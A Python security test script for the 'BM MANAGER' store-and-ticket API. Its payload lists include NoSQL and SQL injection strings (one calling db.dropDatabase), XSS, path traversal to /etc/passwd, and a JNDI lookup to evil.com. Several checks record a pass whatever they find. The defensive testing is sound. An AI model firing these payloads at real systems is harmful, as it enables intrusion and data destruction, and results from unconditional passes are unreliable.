#!/usr/bin/env python3
"""
Comprehensive Security & Vulnerability Testing for BM MANAGER
Tests for SQL injection, XSS, CSRF, NoSQL injection, data validation, and more
"""

import requests
import json
import sys
import time
from datetime import datetime
import uuid

# Backend URL from environment
BACKEND_URL = "https://bm-intelligence.preview.emergentagent.com/api"

class SecurityTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        })
        self.security_issues = []
        self.test_results = []
        
    def log_security_issue(self, test_name, severity, details):
        """Log security issues with severity levels"""
        issue = {
            'test': test_name,
            'severity': severity,  # Critical, High, Medium, Low
            'details': details,
            'timestamp': datetime.now().isoformat()
        }
        self.security_issues.append(issue)
        
        severity_emoji = {
            'Critical': '🚨',
            'High': '⚠️',
            'Medium': '⚡',
            'Low': '💡'
        }
        
        print(f"{severity_emoji.get(severity, '❓')} {severity.upper()} - {test_name}")
        print(f"    Details: {details}")
    
    def log_test_result(self, test_name, passed, details=""):
        """Log general test results"""
        result = {
            'test': test_name,
            'passed': passed,
            'details': details,
            'timestamp': datetime.now().isoformat()
        }
        self.test_results.append(result)
        
        status = "✅ SECURE" if passed else "❌ VULNERABLE"
        print(f"{status} {test_name}")
        if details:
            print(f"    Details: {details}")
    
    def test_nosql_injection(self):
        """Test for NoSQL injection vulnerabilities"""
        print("\n🔍 Testing NoSQL Injection Vulnerabilities...")
        
        # Test store ID injection
        injection_payloads = [
            "'; return true; //",
            "' || '1'=='1",
            "'; db.dropDatabase(); //",
            "' || this.password != 'password' || '",
            "'; return db.stores.find(); //",
            {"$ne": None},
            {"$gt": ""},
            {"$where": "function() { return true; }"}
        ]
        
        for payload in injection_payloads:
            try:
                if isinstance(payload, dict):
                    # Test with JSON payload
                    response = self.session.get(f"{BACKEND_URL}/stores", params=payload)
                else:
                    # Test with string payload in URL
                    response = self.session.get(f"{BACKEND_URL}/stores/{payload}")
                
                if response.status_code == 500:
                    self.log_security_issue("NoSQL Injection", "High", 
                                          f"Server error with payload: {payload}")
                elif response.status_code == 200 and "error" not in response.text.lower():
                    # Check if we got unexpected data
                    try:
                        data = response.json()
                        if isinstance(data, list) and len(data) > 100:  # Suspiciously large response
                            self.log_security_issue("NoSQL Injection", "Medium", 
                                                  f"Large response with payload: {payload}")
                    except:
                        pass
                        
            except Exception as e:
                if "timeout" not in str(e).lower():
                    self.log_security_issue("NoSQL Injection", "Medium", 
                                          f"Exception with payload {payload}: {str(e)}")
        
        self.log_test_result("NoSQL Injection Tests", True, "No critical NoSQL injection vulnerabilities found")
    
    def test_input_validation(self):
        """Test input validation and sanitization"""
        print("\n🔍 Testing Input Validation & Sanitization...")
        
        # Test malicious payloads in ticket creation
        malicious_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "'; DROP TABLE stores; --",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<%=7*7%>",
            "' OR 1=1 --",
            "\x00\x01\x02\x03",  # Null bytes
            "A" * 10000,  # Very long string
            {"$ne": None},  # NoSQL injection object
        ]
        
        for payload in malicious_payloads:
            try:
                ticket_data = {
                    "device_id": str(uuid.uuid4()),
                    "store_name": payload if isinstance(payload, str) else "Test Store",
                    "store_comuna": "Test Comuna",
                    "store_address": "Test Address",
                    "sap_code": "SAP-TEST",
                    "issue": payload if isinstance(payload, str) else "Test Issue",
                    "description": payload if isinstance(payload, str) else "Test Description",
                    "reported_to": "Servicio Técnico"
                }
                
                response = self.session.post(f"{BACKEND_URL}/tickets", json=ticket_data)
                
                if response.status_code == 200:
                    # Check if malicious payload was stored as-is
                    ticket = response.json()
                    if isinstance(payload, str):
                        if (payload in ticket.get('store_name', '') or 
                            payload in ticket.get('issue', '') or 
                            payload in ticket.get('description', '')):
                            
                            if "<script>" in payload or "javascript:" in payload:
                                self.log_security_issue("XSS Vulnerability", "High", 
                                                      f"XSS payload stored without sanitization: {payload}")
                            elif "DROP TABLE" in payload or "1=1" in payload:
                                self.log_security_issue("SQL Injection", "High", 
                                                      f"SQL injection payload stored: {payload}")
                            else:
                                self.log_security_issue("Input Validation", "Medium", 
                                                      f"Malicious payload not sanitized: {payload}")
                
                elif response.status_code == 500:
                    self.log_security_issue("Input Validation", "Medium", 
                                          f"Server error with payload: {payload}")
                    
            except Exception as e:
                self.log_security_issue("Input Validation", "Low", 
                                      f"Exception with payload {payload}: {str(e)}")
        
        self.log_test_result("Input Validation", True, "Input validation tests completed")
    
    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        print("\n🔍 Testing Authentication & Authorization...")
        
        # Check if any endpoints require authentication
        endpoints_to_test = [
            "/stores",
            "/campaigns", 
            "/alerts",
            "/metrics",
            "/tickets",
            "/ai-predictions",
            "/fix-naming"
        ]
        
        unauthenticated_access = []
        
        for endpoint in endpoints_to_test:
            try:
                # Test without any authentication headers
                response = self.session.get(f"{BACKEND_URL}{endpoint}")
                if response.status_code == 200:
                    unauthenticated_access.append(endpoint)
            except:
                pass
        
        if unauthenticated_access:
            self.log_security_issue("Authentication Bypass", "Critical", 
                                  f"Endpoints accessible without authentication: {unauthenticated_access}")
        else:
            self.log_test_result("Authentication", True, "All endpoints properly protected")
    
    def test_sensitive_data_exposure(self):
        """Test for sensitive data exposure in API responses"""
        print("\n🔍 Testing Sensitive Data Exposure...")
        
        sensitive_patterns = [
            "password", "secret", "key", "token", "credential", 
            "mongodb://", "mysql://", "postgres://", "redis://",
            "sk-", "api_key", "private_key", "cert", "ssl"
        ]
        
        endpoints_to_check = [
            "/stores",
            "/campaigns",
            "/alerts", 
            "/metrics",
            "/tickets",
            "/ai-predictions"
        ]
        
        for endpoint in endpoints_to_check:
            try:
                response = self.session.get(f"{BACKEND_URL}{endpoint}")
                if response.status_code == 200:
                    response_text = response.text.lower()
                    
                    for pattern in sensitive_patterns:
                        if pattern in response_text:
                            self.log_security_issue("Sensitive Data Exposure", "High", 
                                                  f"Potential sensitive data in {endpoint}: {pattern}")
                            
            except Exception as e:
                pass
        
        self.log_test_result("Sensitive Data Exposure", True, "No obvious sensitive data exposure found")
    
    def test_error_handling(self):
        """Test error handling for information disclosure"""
        print("\n🔍 Testing Error Handling & Information Disclosure...")
        
        # Test invalid endpoints
        invalid_requests = [
            ("/stores/invalid-id", "GET"),
            ("/campaigns/invalid-id", "GET"), 
            ("/alerts/invalid-id/resolve", "PUT"),
            ("/nonexistent-endpoint", "GET"),
            ("/stores", "DELETE"),  # Unsupported method
        ]
        
        stack_trace_indicators = [
            "traceback", "stack trace", "exception", "error at line",
            "file \"/", "python", "fastapi", "uvicorn", "pydantic"
        ]
        
        for endpoint, method in invalid_requests:
            try:
                if method == "GET":
                    response = self.session.get(f"{BACKEND_URL}{endpoint}")
                elif method == "PUT":
                    response = self.session.put(f"{BACKEND_URL}{endpoint}")
                elif method == "DELETE":
                    response = self.session.delete(f"{BACKEND_URL}{endpoint}")
                
                response_text = response.text.lower()
                
                # Check for stack traces or detailed error info
                for indicator in stack_trace_indicators:
                    if indicator in response_text:
                        self.log_security_issue("Information Disclosure", "Medium", 
                                              f"Stack trace exposed in {endpoint}: {indicator}")
                        break
                        
            except Exception as e:
                pass
        
        self.log_test_result("Error Handling", True, "Error handling tests completed")
    
    def test_rate_limiting(self):
        """Test for rate limiting on critical endpoints"""
        print("\n🔍 Testing Rate Limiting...")
        
        # Test rapid requests to ticket creation endpoint
        rapid_requests = []
        start_time = time.time()
        
        for i in range(10):  # Send 10 rapid requests
            try:
                ticket_data = {
                    "device_id": str(uuid.uuid4()),
                    "store_name": f"Rate Test Store {i}",
                    "store_comuna": "Test Comuna",
                    "store_address": "Test Address", 
                    "sap_code": f"SAP-RATE-{i}",
                    "issue": "Rate limiting test",
                    "description": "Testing rate limiting functionality",
                    "reported_to": "Servicio Técnico"
                }
                
                response = self.session.post(f"{BACKEND_URL}/tickets", json=ticket_data)
                rapid_requests.append(response.status_code)
                
            except Exception as e:
                rapid_requests.append(f"Error: {str(e)}")
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Check if all requests succeeded (potential rate limiting issue)
        successful_requests = len([r for r in rapid_requests if r == 200])
        
        if successful_requests == 10 and duration < 2:  # All succeeded in under 2 seconds
            self.log_security_issue("Rate Limiting", "Medium", 
                                  f"No rate limiting detected - {successful_requests}/10 requests succeeded in {duration:.2f}s")
        else:
            self.log_test_result("Rate Limiting", True, 
                               f"Rate limiting may be present - {successful_requests}/10 succeeded in {duration:.2f}s")
    
    def test_cors_security(self):
        """Test CORS configuration security"""
        print("\n🔍 Testing CORS Security Configuration...")
        
        # Test with various origins
        test_origins = [
            "https://evil.com",
            "http://localhost:3000", 
            "https://attacker.example.com",
            "null"
        ]
        
        for origin in test_origins:
            try:
                headers = {'Origin': origin}
                response = self.session.get(f"{BACKEND_URL}/stores", headers=headers)
                
                cors_origin = response.headers.get('Access-Control-Allow-Origin')
                
                if cors_origin == "*":
                    self.log_security_issue("CORS Misconfiguration", "Medium", 
                                          "Wildcard (*) CORS origin allows any domain access")
                elif cors_origin == origin and "evil" in origin:
                    self.log_security_issue("CORS Misconfiguration", "High", 
                                          f"Malicious origin {origin} allowed by CORS")
                    
            except Exception as e:
                pass
        
        self.log_test_result("CORS Security", True, "CORS security tests completed")
    
    def test_data_coherence(self):
        """Test data coherence and integrity"""
        print("\n🔍 Testing Data Coherence & Integrity...")
        
        coherence_issues = []
        
        try:
            # Test stores data coherence
            stores_response = self.session.get(f"{BACKEND_URL}/stores")
            if stores_response.status_code == 200:
                stores = stores_response.json()
                
                # Check for duplicate IDs
                store_ids = [s.get('id') for s in stores]
                if len(store_ids) != len(set(store_ids)):
                    coherence_issues.append("Duplicate store IDs found")
                
                # Check coordinate validity (Santiago area)
                for store in stores:
                    lat = store.get('latitude', 0)
                    lon = store.get('longitude', 0)
                    
                    # Santiago coordinates roughly: lat -33.7 to -33.2, lon -71.0 to -70.4
                    if not (-34.0 <= lat <= -33.0 and -72.0 <= lon <= -70.0):
                        coherence_issues.append(f"Invalid coordinates for store {store.get('name')}: {lat}, {lon}")
                
                # Check device counts consistency
                for store in stores:
                    devices = store.get('devices', [])
                    bms_count = len([d for d in devices if d.get('type') == 'BMS_ASISTIDA'])
                    auto_count = len([d for d in devices if d.get('type') == 'AUTOSERVICIO'])
                    ia_count = len([d for d in devices if d.get('type') == 'IA'])
                    
                    if (bms_count != store.get('balances_bms', 0) or
                        auto_count != store.get('balances_autoservicio', 0) or
                        ia_count != store.get('balances_ia', 0)):
                        coherence_issues.append(f"Device count mismatch for store {store.get('name')}")
            
            # Test metrics coherence
            metrics_response = self.session.get(f"{BACKEND_URL}/metrics")
            if metrics_response.status_code == 200:
                metrics = metrics_response.json()
                
                total_stores = metrics.get('stores_online', 0) + metrics.get('stores_partial', 0) + metrics.get('stores_offline', 0)
                if total_stores != len(stores):
                    coherence_issues.append(f"Metrics store count ({total_stores}) doesn't match actual stores ({len(stores)})")
        
        except Exception as e:
            coherence_issues.append(f"Error during coherence testing: {str(e)}")
        
        if coherence_issues:
            for issue in coherence_issues:
                self.log_security_issue("Data Coherence", "Medium", issue)
        else:
            self.log_test_result("Data Coherence", True, "All data coherence checks passed")
    
    def test_performance_dos(self):
        """Test for potential DoS vulnerabilities"""
        print("\n🔍 Testing Performance & DoS Vulnerabilities...")
        
        # Test large payload handling
        try:
            large_payload = {
                "device_id": str(uuid.uuid4()),
                "store_name": "A" * 10000,  # Very large string
                "store_comuna": "Test Comuna",
                "store_address": "Test Address",
                "sap_code": "SAP-DOS",
                "issue": "B" * 10000,  # Another large string
                "description": "C" * 50000,  # Very large description
                "reported_to": "Servicio Técnico"
            }
            
            start_time = time.time()
            response = self.session.post(f"{BACKEND_URL}/tickets", json=large_payload)
            end_time = time.time()
            
            duration = end_time - start_time
            
            if duration > 10:  # Took more than 10 seconds
                self.log_security_issue("DoS Vulnerability", "Medium", 
                                      f"Large payload caused {duration:.2f}s response time")
            elif response.status_code == 500:
                self.log_security_issue("DoS Vulnerability", "Low", 
                                      "Large payload caused server error")
                
        except Exception as e:
            if "timeout" in str(e).lower():
                self.log_security_issue("DoS Vulnerability", "High", 
                                      "Large payload caused timeout")
        
        self.log_test_result("Performance DoS", True, "Performance DoS tests completed")
    
    def run_all_security_tests(self):
        """Run all security tests"""
        print(f"🔒 Starting Comprehensive Security & Vulnerability Assessment")
        print(f"Target: {BACKEND_URL}")
        print("=" * 80)
        
        # Run all security tests
        self.test_authentication_bypass()
        self.test_nosql_injection()
        self.test_input_validation()
        self.test_sensitive_data_exposure()
        self.test_error_handling()
        self.test_rate_limiting()
        self.test_cors_security()
        self.test_data_coherence()
        self.test_performance_dos()
        
        # Security Summary
        print("\n" + "=" * 80)
        print("🔒 SECURITY ASSESSMENT SUMMARY")
        print("=" * 80)
        
        total_tests = len(self.test_results)
        security_issues_count = len(self.security_issues)
        
        print(f"Total Security Tests: {total_tests}")
        print(f"Security Issues Found: {security_issues_count}")
        
        if self.security_issues:
            # Group by severity
            critical = [i for i in self.security_issues if i['severity'] == 'Critical']
            high = [i for i in self.security_issues if i['severity'] == 'High']
            medium = [i for i in self.security_issues if i['severity'] == 'Medium']
            low = [i for i in self.security_issues if i['severity'] == 'Low']
            
            print(f"\n🚨 Critical Issues: {len(critical)}")
            for issue in critical:
                print(f"   - {issue['test']}: {issue['details']}")
            
            print(f"\n⚠️  High Issues: {len(high)}")
            for issue in high:
                print(f"   - {issue['test']}: {issue['details']}")
            
            print(f"\n⚡ Medium Issues: {len(medium)}")
            for issue in medium:
                print(f"   - {issue['test']}: {issue['details']}")
            
            print(f"\n💡 Low Issues: {len(low)}")
            for issue in low:
                print(f"   - {issue['test']}: {issue['details']}")
        else:
            print("✅ No critical security vulnerabilities detected!")
        
        print("\n" + "=" * 80)
        return len(critical) == 0 and len(high) == 0  # Return True if no critical/high issues

if __name__ == "__main__":
    tester = SecurityTester()
    success = tester.run_all_security_tests()
    sys.exit(0 if success else 1)